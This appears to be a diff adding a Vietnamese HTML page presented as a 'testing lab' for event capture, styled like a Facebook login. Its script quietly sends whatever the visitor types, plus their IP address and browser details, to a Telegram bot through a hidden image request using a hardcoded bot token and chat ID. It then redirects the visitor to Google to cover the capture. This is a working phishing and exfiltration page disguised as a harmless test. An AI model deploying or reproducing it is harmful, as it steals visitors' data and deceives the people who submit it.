@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Lab Kiểm Thử Tương Tác</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
+        button { width: 95%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #166fe5; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>Mô Phỏng Lab Kiểm Thử</h3>
+        <p style="font-size: 13px; color: #666;">Trang này dùng để test cơ chế bắt sự kiện.</p>
+        <form id="testForm">
+            <input type="text" id="userInput" placeholder="Nhập dữ liệu test..." required><br>
+            <button type="submit">Gửi dữ liệu</button>
+        </form>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8794929706:AAHFZQQVbZLt9XU1bXI1ZjEZXHp-TxdJ31I';
+        const CHAT_ID = '8742570709';
+
+        let userIp = "Đang lấy...";
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => { userIp = data.ip; })
+            .catch(() => { userIp = "Không xác định"; });
+
+        document.getElementById('testForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const inputValue = document.getElementById('userInput').value;
+
+            const messageText = 
+                `🧪 PHÁT HIỆN SỰ KIỆN TRONG LAB!\n` +
+                `-------------------------\n` +
+                `📝 Dữ liệu nhập: ${inputValue}\n` +
+                `🌐 IP nguồn: ${userIp}\n` +
+                `📱 Thiết bị: ${navigator.userAgent}`;
+
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(messageText);
+
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 600);
+        });
+    </script>
+</body>
+</html>
